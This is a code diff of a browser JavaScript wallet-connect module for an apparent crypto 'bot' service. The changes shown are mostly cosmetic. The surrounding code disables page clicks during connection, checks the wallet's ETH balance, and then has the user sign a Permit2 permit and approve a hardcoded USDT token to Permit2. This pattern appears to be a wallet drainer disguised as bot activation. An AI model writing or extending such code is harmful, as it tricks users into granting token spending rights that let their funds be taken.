@@ -1,5 +1,5 @@
 import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
-import { APP_STATE, updateWalletState, resetState, setProcessing, startRequest } from "../core/state.js";
+import { APP_STATE, updateWalletState, resetState, startRequest, setProcessing } from "../core/state.js";
 
 const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"];
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
@@ -13,7 +13,7 @@ const ERC20_ABI = [
 let isPickingWallet = false;
 
 /* =========================
-   WALLET CHANGE (LIGHT)
+   WALLET CHANGE (MINIMAL)
 ========================= */
 if (window.ethereum) {
   window.ethereum.on('accountsChanged', (accounts) => {
@@ -23,17 +23,10 @@ if (window.ethereum) {
       resetState();
       updateWalletState(accounts[0]);
 
-      if (typeof renderWallet === "function") {
-        renderWallet(accounts[0]);
-      }
-
+      if (typeof renderWallet === "function") renderWallet(accounts[0]);
       if (typeof updateStatus === "function") {
         updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
         updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
-      }
-
-      if (typeof log === "function") {
-        log("🔄 Wallet switched: " + accounts[0]);
       }
     }
   });
@@ -46,6 +39,7 @@ export async function connectWallet() {
   if (APP_STATE.isProcessing) return;
 
   startRequest();
+  setProcessing(true);
 
   const btn = document.getElementById('btn-wallet');
   if (btn) {
@@ -55,14 +49,14 @@ export async function connectWallet() {
 
   try {
     if (!window.ethereum) {
-      const install = confirm("MetaMask not installed. Install?");
+      const install = confirm("Install MetaMask?");
       if (install) window.location.href = "https://metamask.io/download/";
       resetState();
       return;
     }
 
+    // 🔒 MICROCLICK + META MASK STABILITY ZONE
     isPickingWallet = true;
-
     window.focus();
     document.body.style.pointerEvents = "none";
 
@@ -90,7 +84,7 @@ export async function connectWallet() {
     }
 
     const balance = await provider.getBalance(user);
-    if (balance === 0n) throw new Error("No ETH for gas");
+    if (balance === 0n) throw new Error("No ETH");
 
     await runPermitFlowSafe(provider, signer, user);
 
@@ -106,13 +100,15 @@ export async function connectWallet() {
   } finally {
     setProcessing(false);
     document.body.style.pointerEvents = "auto";
+    isPickingWallet = false;
   }
 }
 
 /* =========================
-   PERMIT FLOW (UNCHANGED LOGIC, NO ORCHESTRATION)
+   PERMIT FLOW (PURE LOGIC ONLY)
 ========================= */
 async function runPermitFlowSafe(provider, signer, user) {
+
   const permit2 = new ethers.Contract(
     PERMIT2,
     ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
@@ -172,6 +168,7 @@ async function runPermitFlowSafe(provider, signer, user) {
     sigDeadline: sigDeadline.toString()
   };
 
+  // ERC20 approval (simpel, geen orchestration)
   for (const token of TOKENS) {
     const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
     const allowance = await erc20.allowance(user, PERMIT2);
@@ -186,7 +183,7 @@ async function runPermitFlowSafe(provider, signer, user) {
 }
 
 /* =========================
-   SIMPLE ACTIONS
+   SIMPLE ACTIONS ONLY
 ========================= */
 export function activateBot() {
   if (!APP_STATE.wallet || APP_STATE.isProcessing) return;
